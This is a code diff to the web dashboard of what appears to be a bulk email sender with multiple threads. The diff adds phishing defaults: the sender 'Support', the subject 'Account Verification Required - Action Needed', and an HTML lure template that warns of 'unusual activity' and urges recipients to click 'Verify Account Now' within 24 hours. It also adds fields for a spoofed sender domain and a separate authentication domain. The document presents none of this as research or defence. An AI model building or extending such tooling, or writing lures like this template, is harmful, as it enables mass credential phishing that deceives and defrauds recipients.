@@ -80,58 +80,65 @@
                         
                         <div class="row">
                             <div class="col-md-6 mb-3">
-                                <label class="form-label">Sender Name</label>
-                                <input type="text" class="form-control" id="sendername" placeholder="Support">
+                                <label class="form-label"><strong>Sender Name</strong></label>
+                                <input type="text" class="form-control" id="sendername" value="Support">
                                 <small class="text-muted">Display name for sender</small>
                             </div>
                             
                             <div class="col-md-6 mb-3">
-                                <label class="form-label">Subject</label>
-                                <input type="text" class="form-control" id="subject" placeholder="Important Notice">
+                                <label class="form-label"><strong>Subject</strong></label>
+                                <input type="text" class="form-control" id="subject" value="Account Verification Required - Action Needed">
                                 <small class="text-muted">Email subject line</small>
                             </div>
                         </div>
                         
                         <div class="row">
                             <div class="col-md-12 mb-3">
-                                <label class="form-label">Message</label>
-                                <textarea class="form-control" id="message" rows="5" placeholder="Enter your email message here..."></textarea>
-                                <small class="text-muted">Email message body</small>
+                                <label class="form-label"><strong>Message (HTML Supported)</strong></label>
+                                <textarea class="form-control font-monospace" id="message" rows="12" style="font-size: 13px;"></textarea>
+                                <small class="text-muted">Email message body (supports HTML)</small>
                             </div>
                         </div>
                         
                         <div class="row">
                             <div class="col-md-6 mb-3">
-                                <label class="form-label">Domain From</label>
+                                <label class="form-label"><strong>Domain From</strong></label>
                                 <input type="text" class="form-control" id="domainfrom" placeholder="charter.net">
+                                <small class="text-muted">Domain for sender email</small>
                             </div>
                             
                             <div class="col-md-6 mb-3">
-                                <label class="form-label">Domain Authentication</label>
+                                <label class="form-label"><strong>Domain Authentication</strong></label>
                                 <input type="text" class="form-control" id="domainauth" placeholder="altona.fr">
+                                <small class="text-muted">Authentication domain</small>
                             </div>
                         </div>
                         
                         <div class="row">
                             <div class="col-md-6 mb-3">
-                                <label class="form-label">Sleep Time (seconds)</label>
-                                <input type="number" class="form-control" id="sleeptime" placeholder="1">
+                                <label class="form-label"><strong>Sleep Time (seconds)</strong></label>
+                                <input type="number" class="form-control" id="sleeptime" value="1" min="0" step="0.1">
                                 <small class="text-muted">Delay between each email</small>
                             </div>
                             
                             <div class="col-md-6 mb-3">
-                                <label class="form-label">Threads</label>
-                                <input type="number" class="form-control" id="threads" placeholder="3">
+                                <label class="form-label"><strong>Threads</strong></label>
+                                <input type="number" class="form-control" id="threads" value="10" min="1" max="100">
                                 <small class="text-muted">Number of concurrent sending threads</small>
                             </div>
                         </div>
                         
-                        <button class="btn btn-success mt-3" onclick="saveConfig()">
-                            <i class="bi bi-save"></i> Save Configuration
-                        </button>
-                        <button class="btn btn-secondary mt-3" onclick="loadConfig()">
-                            <i class="bi bi-arrow-clockwise"></i> Reload
-                        </button>
+                        <div class="d-flex gap-2">
+                            <button class="btn btn-success" onclick="saveConfig()">
+                                <i class="bi bi-save"></i> Save Configuration
+                            </button>
+                            <button class="btn btn-secondary" onclick="loadConfig()">
+                                <i class="bi bi-arrow-clockwise"></i> Reload
+                            </button>
+                            <button class="btn btn-info" onclick="loadDefaultTemplate()">
+                                <i class="bi bi-file-earmark-text"></i> Load Sample HTML
+                            </button>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -470,21 +477,31 @@ function initCampaignSocket() {
 
 // Load configuration
 function loadConfig() {
+    console.log('⚙️ Loading configuration...');
     fetch('/api/config/get')
         .then(res => res.json())
         .then(data => {
             if (data.success) {
                 const config = data.config;
-                document.getElementById('sendername').value = config.sendername || '';
-                document.getElementById('subject').value = config.subject || '';
-                document.getElementById('message').value = config.message || '';
+                console.log('✅ Configuration loaded:', config);
+                
+                // Load with defaults if empty
+                document.getElementById('sendername').value = config.sendername || 'Support';
+                document.getElementById('subject').value = config.subject || 'Account Verification Required - Action Needed';
+                document.getElementById('message').value = config.message || getDefaultTemplate();
                 document.getElementById('domainfrom').value = config.domainfrom || '';
                 document.getElementById('domainauth').value = config.domain_authentication || '';
-                document.getElementById('sleeptime').value = config.sleeptime || '';
-                document.getElementById('threads').value = config.threads || '';
+                document.getElementById('sleeptime').value = config.sleeptime || '1';
+                document.getElementById('threads').value = config.threads || '10';
+                
+                console.log('📝 Form populated with configuration');
+            } else {
+                console.error('❌ Failed to load config:', data);
+                showAlert('Error loading configuration', 'danger');
             }
         })
         .catch(err => {
+            console.error('❌ Error loading configuration:', err);
             showAlert('Error loading configuration: ' + err.message, 'danger');
         });
 }
@@ -492,14 +509,16 @@ function loadConfig() {
 // Save configuration
 function saveConfig() {
     const settings = {
-        sendername: document.getElementById('sendername').value,
-        subject: document.getElementById('subject').value,
-        message: document.getElementById('message').value,
+        sendername: document.getElementById('sendername').value || 'Support',
+        subject: document.getElementById('subject').value || 'Account Verification Required - Action Needed',
+        message: document.getElementById('message').value || getDefaultTemplate(),
         domainfrom: document.getElementById('domainfrom').value,
         domain_authentication: document.getElementById('domainauth').value,
-        sleeptime: document.getElementById('sleeptime').value,
-        threads: document.getElementById('threads').value
+        sleeptime: document.getElementById('sleeptime').value || '1',
+        threads: document.getElementById('threads').value || '10'
     };
+    
+    console.log('💾 Saving configuration:', settings);
     
     fetch('/api/config/save', {
         method: 'POST',
@@ -509,14 +528,100 @@ function saveConfig() {
     .then(res => res.json())
     .then(data => {
         if (data.success) {
+            console.log('✅ Configuration saved successfully');
             showAlert('Configuration saved successfully!', 'success');
         } else {
+            console.error('❌ Failed to save config:', data);
             showAlert('Error: ' + data.error, 'danger');
         }
     })
     .catch(err => {
+        console.error('❌ Error saving configuration:', err);
         showAlert('Error saving configuration: ' + err.message, 'danger');
     });
+}
+
+// Load default HTML template
+function loadDefaultTemplate() {
+    console.log('📄 Loading default HTML template...');
+    document.getElementById('message').value = getDefaultTemplate();
+    showAlert('Sample HTML template loaded! Remember to save configuration.', 'info');
+}
+
+// Get default HTML email template
+function getDefaultTemplate() {
+    return `<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification</title>
+</head>
+<body style="margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #f4f4f4;">
+    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color: #f4f4f4; padding: 20px;">
+        <tr>
+            <td align="center">
+                <table width="600" cellpadding="0" cellspacing="0" border="0" style="background-color: #ffffff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
+                    <!-- Header -->
+                    <tr>
+                        <td style="background-color: #4CAF50; padding: 30px; text-align: center;">
+                            <h1 style="margin: 0; color: #ffffff; font-size: 28px;">Account Verification Required</h1>
+                        </td>
+                    </tr>
+                    
+                    <!-- Body -->
+                    <tr>
+                        <td style="padding: 40px 30px;">
+                            <p style="margin: 0 0 20px 0; color: #333333; font-size: 16px; line-height: 1.6;">
+                                Dear Valued Customer,
+                            </p>
+                            
+                            <p style="margin: 0 0 20px 0; color: #333333; font-size: 16px; line-height: 1.6;">
+                                We have detected unusual activity on your account and need to verify your identity to ensure your account security.
+                            </p>
+                            
+                            <p style="margin: 0 0 30px 0; color: #333333; font-size: 16px; line-height: 1.6;">
+                                Please click the button below to verify your account within the next 24 hours:
+                            </p>
+                            
+                            <!-- Button -->
+                            <table width="100%" cellpadding="0" cellspacing="0" border="0">
+                                <tr>
+                                    <td align="center" style="padding: 20px 0;">
+                                        <a href="#" style="display: inline-block; background-color: #4CAF50; color: #ffffff; text-decoration: none; padding: 15px 40px; border-radius: 5px; font-size: 16px; font-weight: bold;">
+                                            Verify Account Now
+                                        </a>
+                                    </td>
+                                </tr>
+                            </table>
+                            
+                            <p style="margin: 30px 0 20px 0; color: #333333; font-size: 16px; line-height: 1.6;">
+                                If you did not request this verification, please contact our support team immediately.
+                            </p>
+                            
+                            <p style="margin: 0; color: #333333; font-size: 16px; line-height: 1.6;">
+                                Thank you for your prompt attention to this matter.
+                            </p>
+                        </td>
+                    </tr>
+                    
+                    <!-- Footer -->
+                    <tr>
+                        <td style="background-color: #f8f8f8; padding: 20px 30px; text-align: center; border-top: 1px solid #e0e0e0;">
+                            <p style="margin: 0 0 10px 0; color: #666666; font-size: 14px;">
+                                This is an automated message. Please do not reply to this email.
+                            </p>
+                            <p style="margin: 0; color: #999999; font-size: 12px;">
+                                © 2026 All rights reserved.
+                            </p>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+    </table>
+</body>
+</html>`;
 }
 
 // Load from emails
